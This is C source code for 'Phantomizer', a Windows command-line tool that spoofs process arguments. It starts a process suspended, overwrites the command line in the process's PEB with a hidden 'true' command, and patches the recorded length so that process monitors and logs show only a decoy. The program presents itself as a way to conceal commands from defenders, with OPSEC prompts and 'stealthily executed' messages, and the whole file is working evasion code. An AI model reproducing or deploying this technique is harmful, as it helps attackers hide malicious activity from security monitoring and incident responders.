// Phantomizer v0.1
// Author: 10N351R
// Borrowed Functions From: mrd0x

#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include <wchar.h>
#include <stdbool.h>
                     
typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
	HANDLE ProcessHandle,
	PROCESS_INFORMATION_CLASS ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG ProcessInformationLength,
	PULONG ReturnLength
	);

void clearInputBuffer() {
	int c;
	while ((c = getchar()) != '\n' && c != EOF) {}
}


// base function from mrd0x
BOOL CreateArgSpoofedProcess(IN LPWSTR szStartupArgs, IN LPWSTR szRealArgs, IN LPSTR szAdv_False_Arg, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	NTSTATUS                      STATUS = NULL;

	WCHAR                         szProcess[MAX_PATH];

	STARTUPINFOW                  Si = { 0 };
	PROCESS_INFORMATION           Pi = { 0 };

	PROCESS_BASIC_INFORMATION     PBI = { 0 };
	ULONG                         uRetern = NULL;

	PPEB                          pPeb = NULL;
	PRTL_USER_PROCESS_PARAMETERS  pParms = NULL;


	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOW));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	Si.cb = sizeof(STARTUPINFOW);

	// Getting the address of the NtQueryInformationProcess function
	fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess");
	if (pNtQueryInformationProcess == NULL)
		return FALSE;

	wprintf(L"[i] Target process will be created with the following spoofed command: \"%s\"\n", szStartupArgs);
	wprintf(L"[i] Target process will execute the true command: \"%s\"\n", szRealArgs);

	lstrcpyW(szProcess, szStartupArgs);

	printf("\t[i] Creating Process in Suspended State\n");

	if (!CreateProcessW(NULL, szProcess, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, L"C:\\Windows\\System32\\", &Si, &Pi)) {
		printf("\t[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("\t[i] Created Process with PID: %d\n", Pi.dwProcessId);

	// Getting the PROCESS_BASIC_INFORMATION structure of the remote process which contains the PEB address
	if ((STATUS = pNtQueryInformationProcess(Pi.hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &uRetern)) != 0) {
		printf("\t[!] NtQueryInformationProcess Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	printf("\t[i] Reading Target Process PEB Structure ...\n");

	// Reading the PEB structure from its base address in the remote process
	if (!ReadFromTargetProcess(Pi.hProcess, PBI.PebBaseAddress, &pPeb, sizeof(PEB))) {
		printf("\t[!] Failed To Read Target's Process Peb \n");
		return FALSE;
	}

	printf("\t[i] Reading Target Process RTL_USER_PROCESS_PARAMETERS Structure from PEB ...\n");

	// Reading the RTL_USER_PROCESS_PARAMETERS structure from the PEB of the remote process
	// Read an extra 0xFF bytes to ensure we have reached the CommandLine.Buffer pointer
	if (!ReadFromTargetProcess(Pi.hProcess, pPeb->ProcessParameters, &pParms, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF)) {
		printf("\t[!] Failed To Read Target's Process ProcessParameters \n");
		return FALSE;
	}

	printf("\t[i] Writing to True Arguments to Target Process ...\n");

	// Writing the real argument to the process
	if (!WriteToTargetProcess(Pi.hProcess, (PVOID)pParms->CommandLine.Buffer, (PVOID)szRealArgs, (DWORD)(lstrlenW(szRealArgs) * sizeof(WCHAR) + 1))) {
		printf("\t[!] Failed To Write The Real Parameters\n");
		return FALSE;
	}

	// patching CommandLine.Length
	DWORD dwNewLen = (DWORD)(wcslen(szAdv_False_Arg) * sizeof(wchar_t));

	printf("\t[i] Reverting PEB CommandLine.Length to size of: %d to reveal only \"%ls\"...\n", dwNewLen, szAdv_False_Arg);

	if (!WriteToTargetProcess(Pi.hProcess, ((PBYTE)pPeb->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)), (PVOID)&dwNewLen, sizeof(DWORD))) {
		return FALSE;
	}

	// Cleaning up
	HeapFree(GetProcessHeap(), NULL, pPeb);
	HeapFree(GetProcessHeap(), NULL, pParms);

	printf("\t[i] Resumeing Target Process\n");

	// Resuming the process with the new paramters
	ResumeThread(Pi.hThread);

	// Saving output parameters
	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	// Checking if everything is valid
	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}

// helper functions, thanks mrd0x
BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN DWORD dwBufferSize) {

	SIZE_T	sNmbrOfBytesRead = NULL;

	*ppReadBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize);

	if (!ReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &sNmbrOfBytesRead) || sNmbrOfBytesRead != dwBufferSize) {
		printf("[!] ReadProcessMemory Failed With Error : %d \n", GetLastError());
		printf("[i] Bytes Read : %d Of %d \n", sNmbrOfBytesRead, dwBufferSize);
		return FALSE;
	}

	return TRUE;
}

BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVOID pBuffer, IN DWORD dwBufferSize) {

	SIZE_T sNmbrOfBytesWritten = NULL;

	if (!WriteProcessMemory(hProcess, pAddressToWriteTo, pBuffer, dwBufferSize, &sNmbrOfBytesWritten) || sNmbrOfBytesWritten != dwBufferSize) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		printf("[i] Bytes Written : %d Of %d \n", sNmbrOfBytesWritten, dwBufferSize);
		return FALSE;
	}

	return TRUE;
}

int main() {

	DWORD* dwProcessId = NULL;
	HANDLE* hProcess = NULL;
	HANDLE* hThread = NULL;

	wchar_t false_arg[10000];
	wchar_t adv_false_arg[10000];
	wchar_t true_arg[10000];

	printf("Welcome to Phantomizer - A simple way to conceal your commands from process monitors and logs.\n");
	printf("Author: 10N351R, Borrowed heavily from: mrd0x\n");
	printf("Version: 0.1\n");
	printf("\n");

	while (true) {
		wprintf(L"[#] Enter the target executable stored in C:\\Windows\\System32 you will be calling (ending in \".exe\"): ");
		if (!wscanf_s(L"%l[^\n]s", adv_false_arg, (unsigned int)sizeof(adv_false_arg) / sizeof(wchar_t)) == 1) {
			wprintf(L"Failed to read input.\n");
		}
		clearInputBuffer();

		wprintf(L"[#] Enter a FULL FALSE COMMAND to appear in logs: ");
		if (!wscanf_s(L"%l[^\n]s", false_arg, (unsigned int)sizeof(false_arg) / sizeof(wchar_t)) == 1) {
			wprintf(L"Failed to read input.\n");
		}
		clearInputBuffer();

		wprintf(L"[#] Enter the FULL TRUE COMMAND to be executed: ");
		if (!wscanf_s(L"%l[^\n]s", true_arg, (unsigned int)sizeof(true_arg) / sizeof(wchar_t)) == 1) {
			wprintf(L"Failed to read input.\n");
		}
		clearInputBuffer();


		wprintf(L"\t[!] OPSEC CHECK: \"%ls\" WILL APPEAR in startup process logs.\n", false_arg);
		wprintf(L"\t[!] OPSEC CHECK: \"%ls\" WILL APPEAR in run-time process logs.\n", adv_false_arg);
		wprintf(L"\t[!] EXEC CHECK: \"%ls\" will be stealthily executed via the target process.\n", true_arg);

		char question_result;
		printf("[i] Please confirm that the above information is correct\n");
		printf("[#] Enter 'y' to confirm, 'n' to re-enter, or 'q' to quit: ");
		scanf_s(" %c", &question_result);
		clearInputBuffer();

		if (question_result == 'y' || question_result == 'Y') {
			if (CreateArgSpoofedProcess(false_arg, true_arg, adv_false_arg, &dwProcessId, &hProcess, &hThread)) {
				printf("[+] Arguments Successfully Spoofed! \n");
			}
			else {
				printf("[X] CreateArgSpoofedProcess Failed \n");
			}
			break; // exit the loop
		}
		else if (question_result == 'q' || question_result == 'Q') {
			printf("[i] Quitting without confirming inputs.\n");
			return 0;
		}
		// else, continue the loop to re-enter input details

	}

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}